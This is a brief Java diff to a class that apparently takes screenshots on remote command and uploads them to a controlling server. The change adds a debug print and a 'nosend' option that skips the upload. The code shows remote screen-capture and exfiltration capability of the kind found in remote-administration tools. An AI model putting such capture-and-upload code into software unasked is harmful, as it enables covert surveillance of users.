@@ -73,6 +73,9 @@ public class FuncPrtScr implements AbstractFunc {
 				} catch (Exception e) {
 					writeToServerIgnoreException("获取屏幕截图失败:" + ClientMain.getErrorInfo(e)+"\n");
 				}
+				System.out.println(cmd);
+				if (params[3].equals("nosend"))
+					return;
 				try {
 					//发送到服务器
 					FileSender.sendFile(new File(finalParam), "prtscr/"+ ClientMain.name, "prtscr" + new Date().getTime(), HandleConn.ip, HandleConn.rft_port);
